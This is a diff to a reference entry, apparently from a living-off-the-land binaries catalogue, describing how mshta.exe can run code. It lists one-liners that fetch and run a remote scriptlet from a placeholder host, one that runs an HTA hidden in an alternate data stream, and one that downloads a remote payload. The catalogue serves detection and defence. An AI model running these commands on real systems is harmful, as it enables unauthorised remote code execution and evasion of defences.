@@ -4,7 +4,7 @@ Description: Used by Windows to execute html applications. (.hta)
 Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: mshta.exe evilfile.hta
+  - Command: mshta.exe {PATH:.hta}
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code
     Category: Execute
@@ -12,22 +12,27 @@ Commands:
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: WSH
-  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
+      - Execute: HTA
+      - Execute: Remote
+  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();
+    Tags:
+      - Execute: VBScript
+  - Command: mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: mshta.exe "C:\ads\file.txt:file.hta"
+    Tags:
+      - Execute: JScript
+  - Command: mshta.exe "{PATH_ABSOLUTE}:file.hta"
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code hidden in alternate data stream
     Category: ADS
@@ -35,8 +40,8 @@ Commands:
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
     Tags:
-      - Execute: WSH
-  - Command: mshta.exe https://example.com/payload
+      - Execute: HTA
+  - Command: mshta.exe {REMOTEURL}
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
